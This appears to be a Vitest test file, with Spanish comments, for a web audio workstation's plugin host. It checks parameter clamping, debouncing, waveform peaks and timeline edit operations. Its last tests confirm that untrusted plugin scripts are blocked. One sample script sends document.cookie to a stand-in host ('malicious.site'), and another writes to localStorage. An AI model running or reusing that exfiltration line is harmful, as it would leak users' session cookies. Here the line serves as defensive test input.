// Fix(waveB-ts): noUncheckedIndexedAccess — aserciones non-null (!) en indexaciones
// garantizadas por el setup de cada test; sin cambios de semántica ni comportamiento.
import { describe, it, expect, vi, afterEach } from 'vitest';
import {
  BUILTIN_PLUGINS,
  createReverbImpulse,
  makeDistortionCurve,
  DELAY_FEEDBACK_MAX_GAIN,
  REVERB_DECAY_DEBOUNCE_MS,
  SATURATOR_DRIVE_DEBOUNCE_MS,
} from './builtinPlugins';
import { pluginHost, clampToDef } from './PluginHost';
import { generateDemoTrackBuffer, generateWaveformPeaks, DEMO_TARGET_PEAK } from './waveformUtils';
import {
  splitClipOperation,
  trimLeftOperation,
  calculateMagneticSnap,
  MIN_CLIP_DURATION,
} from './timelineOps';
import type { AudioClip } from '../types/daw';

// ---------------------------------------------------------------------------
// Mocks headless de Web Audio
// ---------------------------------------------------------------------------

class MockParam {
  value: number;
  calls: number[] = [];
  constructor(v = 0) {
    this.value = v;
  }
  setTargetAtTime(target: number): void {
    this.value = target;
    this.calls.push(target);
  }
  cancelScheduledValues(): void {}
}

class MockNode {
  connect(): void {}
  disconnect(): void {}
}

class MockGain extends MockNode {
  gain = new MockParam(1);
}
class MockDelay extends MockNode {
  delayTime = new MockParam(0);
}
class MockFilter extends MockNode {
  type = '';
  frequency = new MockParam(0);
  Q = new MockParam(1);
}
class MockConvolver extends MockNode {
  buffer: unknown = null;
}
class MockShaper extends MockNode {
  curve: Float32Array | null = null;
  oversample: string = 'none';
}
class MockComp extends MockNode {
  threshold = new MockParam(0);
  knee = new MockParam(0);
  ratio = new MockParam(1);
  attack = new MockParam(0);
  release = new MockParam(0);
}

class MockBuffer {
  numberOfChannels: number;
  length: number;
  sampleRate: number;
  duration: number;
  private data: Float32Array[];
  constructor(channels: number, length: number, sampleRate: number, fill?: (i: number) => number) {
    this.numberOfChannels = channels;
    this.length = length;
    this.sampleRate = sampleRate;
    this.duration = length / sampleRate;
    this.data = [];
    for (let c = 0; c < channels; c++) {
      const d = new Float32Array(length);
      for (let i = 0; i < length; i++) d[i] = fill ? fill(i) : 0;
      this.data.push(d);
    }
  }
  getChannelData(c: number): Float32Array {
    return this.data[c]!;
  }
}

function makeMockCtx(sampleRate = 44100) {
  const gains: MockGain[] = [];
  const shapers: MockShaper[] = [];
  const convolvers: MockConvolver[] = [];
  const filters: MockFilter[] = [];
  const delays: MockDelay[] = [];
  const comps: MockComp[] = [];
  const ctx = {
    currentTime: 5.0,
    sampleRate,
    createGain: () => {
      const n = new MockGain();
      gains.push(n);
      return n;
    },
    createDelay: () => {
      const n = new MockDelay();
      delays.push(n);
      return n;
    },
    createBiquadFilter: () => {
      const n = new MockFilter();
      filters.push(n);
      return n;
    },
    createConvolver: () => {
      const n = new MockConvolver();
      convolvers.push(n);
      return n;
    },
    createWaveShaper: () => {
      const n = new MockShaper();
      shapers.push(n);
      return n;
    },
    createDynamicsCompressor: () => {
      const n = new MockComp();
      comps.push(n);
      return n;
    },
    createBuffer: (ch: number, len: number, sr: number) => new MockBuffer(ch, len, sr),
  } as unknown as BaseAudioContext;
  return { ctx, gains, shapers, convolvers, filters, delays, comps };
}

afterEach(() => {
  vi.useRealTimers();
});

function peakOf(buf: { getChannelData(c: number): Float32Array; length: number; numberOfChannels: number }): number {
  let peak = 0;
  for (let c = 0; c < buf.numberOfChannels; c++) {
    const d = buf.getChannelData(c);
    for (let i = 0; i < buf.length; i++) {
      const a = Math.abs(d[i]!);
      if (a > peak) peak = a;
    }
  }
  return peak;
}

// ---------------------------------------------------------------------------

describe('waveA: seguridad de plugins y operaciones', () => {
  it('delay.feedback con clamp duro <= 0.95 en creación y update', () => {
    expect(DELAY_FEEDBACK_MAX_GAIN).toBeLessThanOrEqual(0.95);
    const { ctx, gains } = makeMockCtx();
    // Creación con valor fuera de rango (>= 100 -> ganancia de loop >= 1 sin clamp)
    const dsp = BUILTIN_PLUGINS.delay!.createDSPNode(ctx, { time: 250, feedback: 150, damp: 6000, mix: 25 });
    const feedbackNode = gains[4]!;
    expect(feedbackNode.gain.value).toBeLessThanOrEqual(0.95);
    // Update con valor abusivo también queda capado
    dsp.updateParameter('feedback', 200);
    expect(feedbackNode.gain.value).toBeLessThanOrEqual(0.95);
  });

  it('PluginHost.createInstanceNode sanitiza feedback abusivo', () => {
    const { ctx, gains } = makeMockCtx();
    const node = pluginHost.createInstanceNode(ctx, {
      instanceId: 'inst_delay',
      pluginId: 'delay',
      name: 'Delay',
      enabled: true,
      parameters: { time: 250, feedback: 200, damp: 6000, mix: 25 },
    });
    expect(node).not.toBeNull();
    expect(gains[4]!.gain.value).toBeLessThanOrEqual(0.95);
    node!.updateParameter('feedback', 500);
    expect(gains[4]!.gain.value).toBeLessThanOrEqual(0.95);
  });

  it('clampToDef por plugin (frecuencias <= 0, ratio < 1, etc.)', () => {
    expect(clampToDef('eq3', 'lowFreq', 0)).toBe(40);
    expect(clampToDef('eq3', 'lowFreq', -100)).toBe(40);
    expect(clampToDef('eq3', 'highFreq', 99999)).toBe(16000);
    expect(clampToDef('compressor', 'ratio', 0.5)).toBe(1);
    expect(clampToDef('delay', 'feedback', 100)).toBe(85);
    expect(clampToDef('reverb', 'decay', 99)).toBe(5.0);
    expect(clampToDef('saturator', 'drive', -5)).toBe(0);
    expect(clampToDef('saturator', 'drive', 500)).toBe(100);
    expect(clampToDef('limiter', 'ceiling', 5)).toBe(0);
    // En rango pasa intacto; NaN cae al default; param desconocido pasa intacto
    expect(clampToDef('eq3', 'lowFreq', 100)).toBe(100);
    expect(clampToDef('eq3', 'lowFreq', NaN)).toBe(100);
    expect(clampToDef('eq3', 'inexistente', 123)).toBe(123);
  });

  it('IR de reverb determinista (misma decay -> mismo buffer)', () => {
    const { ctx } = makeMockCtx();
    const a = createReverbImpulse(ctx, 0.5, 2.5) as unknown as MockBuffer;
    const b = createReverbImpulse(ctx, 0.5, 2.5) as unknown as MockBuffer;
    expect(a.getChannelData(0)).toEqual(b.getChannelData(0));
    expect(a.getChannelData(1)).toEqual(b.getChannelData(1));
    // Distinta decay -> distinto contenido
    const c = createReverbImpulse(ctx, 0.5, 3.5) as unknown as MockBuffer;
    expect(c.getChannelData(0)).not.toEqual(a.getChannelData(0));
  });

  it('reverb no regenera IR por tick (debounce trailing)', () => {
    vi.useFakeTimers();
    const { ctx, convolvers } = makeMockCtx();
    const dsp = BUILTIN_PLUGINS.reverb!.createDSPNode(ctx, { decay: 2.0, mix: 30, damping: 8000 });
    const conv = convolvers[0]!;
    const initial = conv.buffer;
    dsp.updateParameter('decay', 3.0);
    dsp.updateParameter('decay', 3.5);
    dsp.updateParameter('decay', 4.0);
    // Sin regeneración síncrona por tick
    expect(conv.buffer).toBe(initial);
    vi.advanceTimersByTime(REVERB_DECAY_DEBOUNCE_MS + 50);
    expect(conv.buffer).not.toBe(initial);
    dsp.cleanup?.();
  });

  it('saturator: clamp drive 0..100 + debounce de curva', () => {
    vi.useFakeTimers();
    // Creación con drive abusivo equivale a drive 100
    expect(makeDistortionCurve(200 / 2)).toEqual(makeDistortionCurve(100 / 2));
    const { ctx, shapers } = makeMockCtx();
    const dsp = BUILTIN_PLUGINS.saturator!.createDSPNode(ctx, { drive: 25, tone: 6500, mix: 50 });
    const shaper = shapers[0]!;
    const initialCurve = shaper.curve;
    dsp.updateParameter('drive', 90);
    dsp.updateParameter('drive', 95);
    // Debounce: sin recálculo síncrono por tick
    expect(shaper.curve).toBe(initialCurve);
    vi.advanceTimersByTime(SATURATOR_DRIVE_DEBOUNCE_MS + 50);
    expect(shaper.curve).not.toBe(initialCurve);
    expect(shaper.curve).toEqual(makeDistortionCurve(95 / 2));
    dsp.cleanup?.();
  });

  it('saturator: rampa de wet durante el swap de curva', () => {
    vi.useFakeTimers();
    const { ctx, gains, shapers } = makeMockCtx();
    const dsp = BUILTIN_PLUGINS.saturator!.createDSPNode(ctx, { drive: 25, tone: 6500, mix: 50 });
    const wetGain = gains[3]!;
    wetGain.gain.calls = [];
    dsp.updateParameter('drive', 80);
    vi.advanceTimersByTime(SATURATOR_DRIVE_DEBOUNCE_MS + 50);
    // La rampa lleva wet a 0 durante el swap y lo restaura al mix (0.5)
    expect(wetGain.gain.calls).toContain(0);
    expect(shapers[0]!.curve).toEqual(makeDistortionCurve(80 / 2));
    expect(wetGain.gain.calls[wetGain.gain.calls.length - 1]!).toBeCloseTo(0.5, 5);
    dsp.cleanup?.();
  });

  it('demo determinista + pico final <= ~0.89', () => {
    const { ctx } = makeMockCtx();
    const kinds = ['drums', 'bass', 'chords', 'lead'] as const;
    for (const kind of kinds) {
      const a = generateDemoTrackBuffer(ctx, kind, 2, 120) as unknown as MockBuffer;
      const b = generateDemoTrackBuffer(ctx, kind, 2, 120) as unknown as MockBuffer;
      expect(a.getChannelData(0)).toEqual(b.getChannelData(0));
      expect(a.getChannelData(1)).toEqual(b.getChannelData(1));
      expect(peakOf(a)).toBeLessThanOrEqual(DEMO_TARGET_PEAK + 1e-6);
    }
  });

  it('picos en clip corto no-ceros + resto parcial final', () => {
    // Clip corto: length < targetPoints (antes devolvía ceros)
    const shortBuf = new MockBuffer(2, 100, 44100, (i) => Math.sin((2 * Math.PI * 440 * i) / 44100) * 0.5);
    const peaks = generateWaveformPeaks(shortBuf as unknown as AudioBuffer, 800);
    expect(peaks.length).toBe(1600);
    let maxAbs = 0;
    for (let i = 0; i < peaks.length; i++) maxAbs = Math.max(maxAbs, Math.abs(peaks[i]!));
    expect(maxAbs).toBeGreaterThan(0.1);
    // Resto parcial: length 100, 30 puntos -> blockSize 3, último bin cubre [87, 100)
    const tail = new MockBuffer(1, 100, 44100, () => 0.05);
    (tail.getChannelData(0) as Float32Array)[99] = 0.9;
    const tailPeaks = generateWaveformPeaks(tail as unknown as AudioBuffer, 30);
    expect(tailPeaks[29 * 2 + 1]).toBeCloseTo(0.9, 5);
  });

  it('split capa secondDuration al buffer (o null si resto < min)', () => {
    const mkClip = (duration: number, bufferDuration: number | null): AudioClip => ({
      id: 'c1',
      trackId: 't1',
      name: 'clip',
      startTime: 0,
      duration,
      offset: 0,
      audioBuffer: bufferDuration === null ? null : ({ duration: bufferDuration } as unknown as AudioBuffer),
      peaks: new Float32Array(0),
    });
    // Overflow: el clip declara 8s pero la fuente solo tiene 5s
    const res = splitClipOperation(mkClip(8, 5), 3.0);
    expect(res).not.toBeNull();
    expect(res!.clip2.duration).toBeCloseTo(2.0, 5);
    expect(res!.clip2.offset).toBeCloseTo(3.0, 5);
    // Resto insuficiente -> null
    expect(splitClipOperation(mkClip(8, 3.1), 3.0)).toBeNull();
    // Sin buffer no se capa
    const noBuf = splitClipOperation(mkClip(8, null), 3.0);
    expect(noBuf!.clip2.duration).toBeCloseTo(5.0, 5);
  });

  it('trimLeft con overflow respeta max(-startTime, -offset)', () => {
    const clip: AudioClip = {
      id: 'c1',
      trackId: 't1',
      name: 'clip',
      startTime: 1.0,
      duration: 5.0,
      offset: 0.5,
      audioBuffer: null,
      peaks: new Float32Array(0),
    };
    // Extender a la izquierda más allá del offset queda capado a -0.5
    const ext = trimLeftOperation(clip, -1.0);
    expect(ext.startTime).toBeCloseTo(0.5, 5);
    expect(ext.offset).toBeCloseTo(0.0, 5);
    expect(ext.duration).toBeCloseTo(5.5, 5);
    // Acortar más allá del mínimo satura a minDuration
    const short = trimLeftOperation(clip, 100);
    expect(short.duration).toBeCloseTo(MIN_CLIP_DURATION, 5);
  });

  it('snap en 6/8 usa el denominador del compás', () => {
    // En 6/8 a 120bpm: sixteenth = 0.5 * (4/8) / 4 = 0.0625
    const snap68 = calculateMagneticSnap(0.07, 120, [6, 8], [], 0.1);
    expect(snap68.isSnapped).toBe(true);
    expect(snap68.snappedTime).toBeCloseTo(0.0625, 4);
    // El mismo instante en 4/4 cae en otra línea (0.125), no en 0.0625
    const snap44 = calculateMagneticSnap(0.07, 120, [4, 4], [], 0.1);
    expect(snap44.isSnapped).toBe(true);
    expect(snap44.snappedTime).toBeCloseTo(0.125, 4);
  });

  it('snap cubre la ventana por umbral (no ±2 fijos)', () => {
    // Umbral amplio: debe alcanzar líneas lejanas al índice redondeado
    const snap = calculateMagneticSnap(1.0, 120, [4, 4], [], 0.6);
    expect(snap.isSnapped).toBe(true);
    // La mejor candidata dentro de la ventana es el propio 1.0
    expect(snap.snappedTime).toBeCloseTo(1.0, 4);
    // Fuera de ventana no hay snap
    const far = calculateMagneticSnap(0.30, 120, [4, 4], [], 0.02);
    expect(far.isSnapped).toBe(false);
  });

  it('registerCustomPlugin bloquea scripts con acceso a APIs peligrosas (fetch/DOM/Storage)', () => {
    expect(() => {
      pluginHost.registerCustomPlugin(`
        fetch('https://malicious.site/leak?c=' + document.cookie);
        const customPlugin = { id: 'bad', name: 'Bad', createDSPNode: () => {} };
      `);
    }).toThrow(/bloqueado por seguridad/);

    expect(() => {
      pluginHost.registerCustomPlugin(`
        window.localStorage.setItem('compromised', 'true');
        const customPlugin = { id: 'bad2', name: 'Bad 2', createDSPNode: () => {} };
      `);
    }).toThrow(/bloqueado por seguridad/);
  });

  it('registerCustomPlugin admite plugins válidos y seguros', () => {
    const valid = pluginHost.registerCustomPlugin(`
      const customPlugin = {
        id: 'clean_gain',
        name: 'Clean Gain',
        version: '1.0.0',
        parameters: [],
        createDSPNode: (ctx) => {
          const g = ctx.createGain();
          return {
            instanceId: 'i1',
            pluginId: 'clean_gain',
            inputNode: g,
            outputNode: g,
            updateParameter: () => {},
          };
        }
      };
    `);
    expect(valid.id).toBe('clean_gain');
  });
});
